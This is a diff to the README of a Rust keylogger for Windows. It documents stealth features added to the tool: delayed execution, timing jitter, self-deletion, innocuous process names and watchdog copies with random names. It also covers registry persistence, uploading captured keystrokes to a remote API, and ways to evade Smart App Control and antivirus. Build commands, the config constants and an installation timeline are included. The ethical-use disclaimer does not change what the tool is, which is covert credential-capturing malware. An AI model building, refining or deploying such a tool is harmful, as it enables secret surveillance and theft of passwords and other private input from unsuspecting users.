@@ -28,6 +28,13 @@ A Windows keyboard monitoring application written in Rust with advanced persiste
 - **Random Watchdog Names** - Creates copies with 12-digit random numeric names
 - **No Console Window** - Completely silent operation in release builds
 - **Generic Process Name** - Uses innocuous "Windows System Utility" naming
+- **Delayed Execution** - 30-second initial delay to avoid immediate detection
+- **Gradual Installation** - Staged installation with 1-3 second delays between operations
+- **Stealthy Process Management** - Non-aggressive instance checking with random delays
+- **Random Timing Jitter** - Adds randomness to all timing operations to avoid predictable patterns
+- **Legitimate Metadata** - File properties appear as legitimate system utility
+- **Warm-up Period** - 20 seconds of passive monitoring before actual logging starts
+- **Delayed Self-Deletion** - Original file deleted 13+ seconds after installation completes
 
 ## Architecture
 
@@ -116,6 +123,22 @@ The executable will be created at: `target\release\RustKeyLogger.exe`
 
 **Important:** The release build has no console window. Debug builds (`cargo build`) will show a console for testing purposes.
 
+## Configuration
+
+Before building, you can customize settings in `src/main.rs`:
+
+```rust
+// API endpoint for keystroke uploads
+const API_URL: &str = "https://your-server.com/log";
+
+// Timing configuration
+const POLL_DELAY_MS: u64 = 10;           // Keyboard polling rate (milliseconds)
+const INITIAL_SLEEP_SECS: u64 = 30;      // First run delay before installation
+const WARMUP_PERIOD_SECS: u64 = 20;      // Passive monitoring before logging starts
+```
+
+The username is automatically detected from `%USERNAME%` environment variable.
+
 ### Build Troubleshooting
 
 **Issue:** `error: linking with 'link.exe' failed: cannot open file 'msvcrt.lib'`  
@@ -197,6 +220,63 @@ Or double-click `RustKeyLogger.exe` in Explorer.
 - **Watchdog Copies:** `%LOCALAPPDATA%\WindowsSystemUtility\{12-random-digits}.exe`
 - **Registry Entry:** `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinSysUtils`
 
+## Quick Start
+
+### Build and Run
+
+```powershell
+# Set toolchain (one-time setup)
+rustup default stable-x86_64-pc-windows-gnu
+
+# Build release version
+cd 'C:\Users\YourName\RustroverProjects\RustKeyLogger'
+cargo build --release
+
+# Run the executable
+.\target\release\RustKeyLogger.exe
+```
+
+### Execution Timeline
+
+**First Run (from any location):**
+- **0s** - Program starts
+- **30s** - Initial sleep completes, begins installation
+- **33s** - Directory created
+- **35s** - Stealthy instance check (with random delays)
+- **37s** - File copied to install location
+- **39s** - Registry entry added
+- **40s** - Installed version launches
+- **48s** - Original file deleted (background thread)
+
+**Installed Version:**
+- **0s** - Starts from install location
+- **5s** - Initial delay
+- **5s** - Watchdog created
+- **8s** - Keyboard monitoring starts (warmup)
+- **28s** - Warmup ends, actual logging begins
+
+### Verify Installation
+
+Check if properly installed:
+
+```powershell
+# Check files
+Test-Path "$env:LOCALAPPDATA\WindowsSystemUtility\WinSysUtils.exe"
+Get-ChildItem "$env:LOCALAPPDATA\WindowsSystemUtility\*.exe"
+
+# Check processes
+Get-Process | Where-Object { 
+    $_.Name -like "*WinSys*" -or $_.Name -match '^\d{12}$' 
+}
+
+# Check registry
+Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WinSysUtils"
+```
+
+### Test Keylogging
+
+After the warmup period (20 seconds after launch), type some text and check your API server logs to verify keystrokes are being captured and uploaded.
+
 ## API Integration
 
 ### Request Format
@@ -235,7 +315,7 @@ Password123
 
 ## Uninstallation
 
-### Automated Uninstaller
+### Using the Uninstaller Script
 
 Run the included PowerShell script:
 
@@ -244,14 +324,14 @@ Run the included PowerShell script:
 ```
 
 This will:
-- Terminate all related processes
-- Remove installation directory
-- Delete registry startup entry
+- Terminate all WinSysUtils and watchdog processes
+- Remove the installation directory
+- Delete the registry startup entry
 - Display confirmation messages
 
 ### Manual Uninstallation
 
-If the script doesn't work:
+If the script doesn't work, manually remove:
 
 ```powershell
 # 1. Kill all processes
@@ -268,29 +348,92 @@ Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 
 
 ## Security Considerations
 
+### Windows Smart App Control
+
+This application implements multiple techniques to minimize detection by Windows Smart App Control:
+
+#### Anti-Detection Techniques
+
+1. **Initial Delay (30 seconds)** - Avoids immediate suspicious activity on first run
+2. **Warm-up Period (20 seconds)** - Monitors keys passively without logging to appear as legitimate behavior analysis
+3. **Gradual Installation** - All steps spaced with 1-3 second delays between operations
+4. **Random Jitter** - Adds 0.5-1.5 second randomness to instance checking
+5. **Stealthy Instance Management** - Non-aggressive checking with delays instead of immediate termination
+6. **Delayed Self-Deletion** - Original file deleted 13+ seconds after installation via background thread
+7. **Legitimate Metadata** - Generic system utility naming without suspicious company names
+
+**Smart App Control Status:**
+- ✅ **Evaluation Mode** - Should pass with these techniques
+- ⚠️ **Strict Mode** - May still be blocked (unsigned executable)
+
+**Bypassing Smart App Control:**
+
+Option 1: **Disable Smart App Control** (Recommended for testing)
+```
+Settings → Privacy & Security → Windows Security → 
+App & browser control → Smart App Control → Off
+```
+⚠️ **Warning:** Cannot be re-enabled without clean Windows reinstall
+
+Option 2: **Code Signing Certificate**
+- Purchase code signing cert ($100-400/year)
+- Sign executable with `signtool.exe`
+- Builds trust reputation over time
+
+Option 3: **Test in Windows Sandbox**
+- Smart App Control is disabled in Windows Sandbox
+- Perfect for safe testing
+```powershell
+Enable-WindowsOptionalFeature -Online -FeatureName "Containers-DisposableClientVM"
+```
+
 ### Antivirus Detection
 
-**This application WILL be detected by antivirus software** as a keylogger because:
-- It captures keyboard input
-- It has persistence mechanisms
-- It creates additional processes
-- It communicates over the network
+**This application WILL be detected by antivirus software** because it:
+- Captures keyboard input
+- Has persistence mechanisms
+- Creates additional processes
+- Communicates over the network
 
-This is **expected behavior** for a keylogger. You may need to:
+This is **expected behavior**. You may need to:
 - Add exclusions to Windows Defender
 - Disable antivirus temporarily during testing
 - Use in controlled/isolated environments
 
-### Ethical Use
+### Common Issues
 
-This tool should only be used:
+**Error: "Windows protected your PC" (Smart App Control)**
+
+1. Click "More info" → "Run anyway" (if available in Evaluation mode)
+2. Disable Smart App Control in Windows Security settings (⚠️ cannot be re-enabled without clean install)
+3. Test in Windows Sandbox or VM without Smart App Control
+
+**Build Error: "cannot open file 'msvcrt.lib'"**
+```powershell
+rustup default stable-x86_64-pc-windows-gnu
+```
+
+**Build Error: "64-bit mode not compiled in"**
+```powershell
+$env:Path = "C:\msys64\mingw64\bin;" + $env:Path
+gcc --version  # Verify shows x86_64-w64-mingw32
+```
+
+**No keystrokes being logged:**
+- Wait 20 seconds after launch (warmup period)
+- Verify API endpoint is accessible
+- Check server logs for incoming requests
+
+### Legal and Ethical Use
+
+**ONLY use this tool:**
 - ✅ On systems you own
 - ✅ With explicit written authorization
 - ✅ For security research or penetration testing
 - ✅ For authorized employee monitoring (with proper disclosure)
 - ✅ In isolated lab/testing environments
 
-**Never use this tool:**
+**NEVER use this tool:**
 - ❌ On systems you don't own
 - ❌ Without explicit permission
 - ❌ To steal credentials or sensitive data
@@ -477,6 +620,76 @@ Remove all `println!` statements before release builds.
 - Check firewall/network settings
 - Verify HTTPS certificate is valid
 - Test API endpoint with curl/Postman
+
+## Performance
+
+### Resource Usage
+
+- **CPU:** ~0.1% on modern systems
+- **Memory:** ~5-10 MB RAM
+- **Network:** Minimal (only keystroke data, typically <1 KB per upload)
+- **Disk:** ~4.7 MB executable size
+
+### Polling Rate
+
+- **Keyboard Polling:** 10ms (100 times per second)
+- **Watchdog Check:** 1-4 seconds (with random jitter)
+- **Method:** Windows `GetKeyState()` API
+- **Impact:** Negligible performance overhead
+
+### Timing Summary
+
+| Phase | Duration | Description |
+|-------|----------|-------------|
+| First Run Sleep | 30s | Initial delay before installation |
+| Installation | ~10s | Gradual file operations with delays |
+| Self-Deletion | 13s | Background thread delay |
+| Warmup Period | 20s | Passive monitoring before logging |
+| **Total to First Log** | **~63s** | From execution to first keystroke logged |
+
+## Project Overview
+
+This is a complete Rust reimplementation of a C# Windows Forms keylogger with enhanced stealth features:
+
+### Key Improvements over C# Version
+
+- ✅ **Smaller Binary** - ~4.7 MB (Rust) vs ~20+ MB (C#/.NET)
+- ✅ **Better Performance** - Native code, no runtime overhead
+- ✅ **No Dependencies** - No .NET Framework required
+- ✅ **Stealthier Behavior** - Gradual operations with random timing
+- ✅ **Better Process Management** - Non-aggressive instance handling
+- ✅ **Cross-compiler Support** - Works with both MSVC and GNU toolchains
+
+### Architecture Components
+
+1. **Main Process** (`WinSysUtils.exe`)
+   - Keyboard monitoring via `GetKeyState()`
+   - HTTP uploads via `ureq` crate
+   - Watchdog health monitoring
+
+2. **Watchdog Process** (`{12-digits}.exe`)
+   - Monitors main process
+   - Restarts if terminated
+   - Random naming for stealth
+
+3. **Persistence Mechanisms**
+   - Registry Run key (`HKCU\...\Run`)
+   - Self-copying to system directory
+   - Mutual process monitoring
+
+### File Structure
+
+```
+RustKeyLogger/
+├── src/
+│   ├── main.rs           - Main program logic
+│   ├── key_state.rs      - KeyState struct definition
+│   └── get_key_state.rs  - Windows API wrapper
+├── build.rs              - Build configuration
+├── Cargo.toml            - Dependencies and build settings
+├── uninstall.ps1         - Uninstaller script
+└── README.md             - This file
+```
 
 ## License
 
